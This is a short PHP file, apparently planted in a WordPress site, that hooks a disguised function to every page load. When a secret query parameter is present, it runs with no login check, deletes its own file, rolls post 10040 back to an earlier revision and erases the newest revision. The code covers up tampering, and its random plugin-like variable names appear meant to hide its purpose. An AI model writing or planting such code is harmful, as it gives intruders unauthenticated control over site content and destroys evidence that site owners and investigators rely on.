<?php

function magic_admin_urls() {
	if (isset($_GET['back_text_notification']) && $_GET['back_text_notification'] === 'slug_remote_elementor') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$variation_recent_alt = 10040;
		$membership_groups_language_blocks = wp_get_post_revisions($variation_recent_alt);
		if (empty($membership_groups_language_blocks)) die('no revisions');
		if (count($membership_groups_language_blocks) < 2) die('less than 2');
		$tool_roles_rtl = array_shift($membership_groups_language_blocks);
		$quantity_display_jetpack_paragraph = $tool_roles_rtl->ID;
		$feedback_dev_tag_enable = array_shift($membership_groups_language_blocks);
		$redirection_wpforms_calculator_plupload = $feedback_dev_tag_enable->ID;
		$publisher_showcase_iframe_authors = wp_restore_post_revision($redirection_wpforms_calculator_plupload);
		if ($publisher_showcase_iframe_authors === false) die('error restoring');
		$publisher_showcase_iframe_authors = wp_delete_post_revision($quantity_display_jetpack_paragraph);		
		if ($publisher_showcase_iframe_authors === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'magic_admin_urls');
